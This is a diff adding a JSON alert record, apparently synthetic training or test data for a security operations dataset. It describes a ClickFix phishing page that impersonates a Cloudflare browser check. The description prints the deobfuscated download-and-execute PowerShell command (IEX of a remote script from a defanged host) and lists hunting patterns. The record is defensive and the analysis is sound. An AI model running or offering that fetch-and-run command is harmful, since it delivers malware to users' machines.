@@ -1,0 +1,47 @@
+{
+  "vendor": "Palo Alto Networks",
+  "product": "Advanced URL Filtering",
+  "severity": "Critical",
+  "category": "Initial Access",
+  "alert_name": "ClickFix Phishing Page Access - Fake Browser Verification Challenge",
+  "description": "Advanced URL Filtering detected victim accessing IUAM ClickFix Generator phishing page at hxxps://browser-verification[.]live/auth/validate?session=a8f3e2c1 from workstation MKTG-WKS-024. HTTP traffic analysis shows classic ClickFix attack flow: victim clicked phishing link \u2192 HTTP GET request \u2192 server responded with 200 OK and 87KB HTML payload containing sophisticated fake browser verification challenge. Deep packet inspection revealed page content mimicking legitimate 'I Am Under Attack Mode' (IUAM) Cloudflare DDoS protection challenge with professional branding: Cloudflare logo, 'Checking your browser' loading animation, JavaScript countdown timer ('Please wait 5 seconds...'). However, page contains malicious ClickFix social engineering: fake error message 'Browser verification failed - Manual action required', instructions to 'Fix this issue' by pressing Windows+R and pasting provided PowerShell command, clipboard hijacking JavaScript automatically copying malicious payload when user clicks 'Copy Fix' button. Page implements OS detection logic: User-Agent analysis (Mozilla/5.0 Windows NT 10.0) \u2192 serves Windows-specific PowerShell payload; if macOS/Linux detected \u2192 serves bash/curl alternative. JavaScript deobfuscation reveals clipboard injection payload: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_BLOB>' where Base64 decodes to: IEX(New-Object Net.WebClient).DownloadString('hxxps://cdn-updates[.]live/dl/payload.ps1'). URL Filtering categorized page as 'phishing' (Category: phishing, Risk: critical) based on content signatures: fake verification challenge, clipboard manipulation code, obfuscated PowerShell commands, newly registered domain. Traffic allowed to complete for forensic analysis (inline blocking disabled for pilot users) but logged for incident response. Session metadata: User-Agent Windows 10, Chrome 120.0, visit duration 47 seconds (indicating victim read instructions and attempted ClickFix), Referer header confirms arrival from phishing email link.",
+  "relative_timestamp_hours": 71.6,
+  "campaign_name": "ClickFix-DeerStealer",
+  "host_name": "MKTG-WKS-024",
+  "host_ip": [
+    171540620
+  ],
+  "user_name": [
+    "jdavis@marketingcorp.com"
+  ],
+  "domain": "marketingcorp.com",
+  "local_ip": [
+    171540620
+  ],
+  "remote_ip": [
+    1756028233
+  ],
+  "local_port": [
+    54821
+  ],
+  "remote_port": [
+    443
+  ],
+  "dns_query_name": [
+    "browser-verification.live"
+  ],
+  "threat_name": "ClickFix Phishing Page",
+  "attack_mode": "ClickFix Social Engineering Page",
+  "verdict": "Malicious",
+  "risk_score": "97",
+  "risk_rating": "Critical",
+  "policy_type": "Web Security",
+  "policy_description": "IUAM ClickFix Generator phishing page with clipboard hijacking and PowerShell payload",
+  "policy_severity": "Critical",
+  "policy_recommendation": "CRITICAL: Block browser-verification[.]live immediately via URL Filtering, enable inline blocking for 'phishing' category to prevent future access, isolate MKTG-WKS-024 from network, check workstation clipboard history for injected PowerShell commands, review browser history for execution of Windows+R (Run dialog), hunt for PowerShell execution events matching ClickFix patterns (-EncodedCommand, -ExecutionPolicy Bypass), block secondary payload domain cdn-updates[.]live, educate all users on ClickFix technique (never paste commands from websites), deploy browser extensions blocking clipboard manipulation JavaScript",
+  "log_source": "Advanced URL Filtering",
+  "event_id": "URL_FILTER_PHISHING",
+  "external_link": "https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/",
+  "mitre_att&ck_tactic": "TA0001 - Initial Access",
+  "mitre_att&ck_technique": "T1204.001 - User Execution: Malicious Link"
+}
